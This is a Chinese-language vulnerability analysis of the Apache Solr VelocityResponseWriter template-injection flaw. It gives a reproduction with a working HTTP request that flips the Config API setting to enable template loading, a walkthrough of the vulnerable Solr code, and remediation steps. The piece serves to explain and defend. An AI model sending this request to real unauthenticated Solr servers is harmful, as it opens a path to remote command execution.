### Apache Solr 简介
Apache Solr 是一个用 Java 编写的企业级开源搜索平台，基于 Apache Lucene 项目。

### Apache Velocity 简介
根据 Apache 官方介绍，[Velocity](http://velocity.apache.org/) 是一个基于 Java 的模板引擎。其主要功能包括：
- **Web 开发**：在 Model-View-Controller (MVC) 模型中，Velocity 可作为视图引擎，将 Java 代码与网页分离，替代 JSP。
- **非 Web 领域**：可用于生成源代码和报告的独立工具，也可集成到其他系统中。

### 漏洞复现
#### 前置条件
1. Solr 控制台未设置鉴权（默认情况下），或登录凭证被猜出，从而可以访问 Config API。
2. 某个索引库（core）的 `solrconfig.xml` 文件中包含特定配置，才会受到该漏洞的影响。参考 [S00pY 在 GitHub 发布的 POC](https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt)。

#### 漏洞复现步骤
**第一步**
设置 `VelocityResponseWriter` 插件的 `params.resource.loader.enabled` 选项为 `true`。

Apache Solr 默认带有 `VelocityResponseWriter` 插件，该插件的 `params.resource.loader.enabled` 选项（默认为 `false`）用于控制是否允许通过 Solr 请求参数指定模板。以下 HTTP 请求会将该选项设置为 `true`，允许用户通过 HTTP 请求指定资源加载：

```http
POST /solr/core_name/config HTTP/1.1
Host: solr.com:8983
Content-Type: application/json
Content-Length: 293

{
    "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
    }
}
```

如果响应状态码为 `HTTP/1.1 200 OK`，则表示修改成功，并且会在 `/core_name/conf/configoverlay.json` 文件中创建如下内容：

```json
{
    "queryResponseWriter": {
        "velocity": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
}
```

若响应状态码为 `404`，则表示修改失败，通常是因为该 core 对应的 `solrconfig.xml` 中没有配置 `VelocityResponseWriter` 插件。

**第二步**
构造一个自定义的 Velocity 模板，以执行任意系统命令。例如，执行 `ls -a` 命令。

### 漏洞分析
#### 分析方法
使用动态调试进行分析。

- **参数解释**：
  - `wt`：输出结果格式，如 `json` 或 `xml`。如果设置为 `velocity`，则通过 Velocity 引擎解析。
  - `v.template`：模板名称，例如设置为 `template1`。
  - `v.template.template1`：自定义模板 `template1` 的具体内容。

从 HTTP 请求开始追踪，找到并跟踪 `/solr-8.2.0/dist/solr-core-8.2.0.jar!/org/apache/solr/handler/RequestHandlerBase.class` 类中的 `handleRequest` 方法。在 `writeResponse` 方法中可以看到 GET 请求的完整 URL。

关键语句：
```java
responseWriter.write(writer, solrRequest, solrResponse);
```

跟进 `VelocityResponseWriter` 类的 `write` 方法和 `createEngine` 方法。在 `createEngine` 方法中，创建了一个 `VelocityEngine` 对象，并设置了相关属性。

- **if 语句 1**：
  ```java
  if (this.paramsResourceLoaderEnabled) {
      loaders.add("params");
      engine.setProperty("params.resource.loader.instance", new SolrParamResourceLoader(request));
  }
  ```
  该语句从 HTTP 请求中获取模板名称，并将其内容存储在 `templates` hashmap 中。

- **if 语句 2**：
  ```java
  if (this.solrResourceLoaderEnabled) {
      loaders.add("solr");
      engine.setProperty("solr.resource.loader.instance", new SolrVelocityResourceLoader(request.getCore().getSolrConfig().getResourceLoader()));
  }
  ```
  该语句根据当前请求的索引库名称和配置信息，设置 `solr.resource.loader.instance` 属性。

继续执行 `getTemplate` 和 `createContext` 方法，最终调用 `template.merge(context, writer);` 执行命令。调用栈显示了 `java.lang.Runtime` 类的 `exec` 方法，实现命令执行。

### 修复方案
1. **设置鉴权**：为 Apache Solr 设置 Web 鉴权（强口令），避免通过发送请求到 Config API 实现配置修改。参考 [Basic Authentication Plugin | Apache Solr Reference Guide 8.2](https://lucene.apache.org/solr/guide/8_2/basic-authentication-plugin.html)。
2. **根本解决**：不使用自带的可选库。删除对应索引库文件夹下的 `solrconfig.xml` 中与 Velocity 相关的内容，并删除 `configoverlay.json` 文件。

### 总结
本次 Apache Solr 模板注入漏洞的第一步是通过 Config API 更改配置。此前的 [CVE-2019-0193](https://xz.aliyun.com/t/5965) 漏洞检测方式也涉及通过 Config API 更改配置。Apache Solr 的 Config API 是一个内置功能，用于通过 HTTP 请求更改配置；当 Solr 未设置访问鉴权时，可以直接通过 Config API 更改配置，从而为漏洞利用创造了前提。